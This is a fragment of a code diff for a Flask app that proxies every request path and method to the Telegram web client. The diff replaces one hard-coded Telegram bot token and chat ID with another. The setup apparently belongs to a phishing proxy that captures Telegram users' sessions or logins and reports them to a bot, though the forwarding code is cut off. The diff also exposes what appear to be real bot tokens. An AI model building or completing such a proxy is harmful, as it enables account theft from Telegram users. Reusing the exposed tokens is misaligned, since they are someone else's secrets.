@@ -8,8 +8,8 @@ app = Flask(__name__)
 BASE_URL = 'https://web.telegram.org/k/'
 
 # Your Telegram bot token and chat ID
-TELEGRAM_BOT_TOKEN = '7748600145:AAFIALKClYzW9ACeA4GvOuyQQTb1mOcSf1o'
-TELEGRAM_CHAT_ID = '-4580685528'
+TELEGRAM_BOT_TOKEN = '7859238179:AAHJvboPix9pEkq_xNSh2RJFf3EhLqWlQEY'
+TELEGRAM_CHAT_ID = '-1002597819223'
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
 def proxy(path):
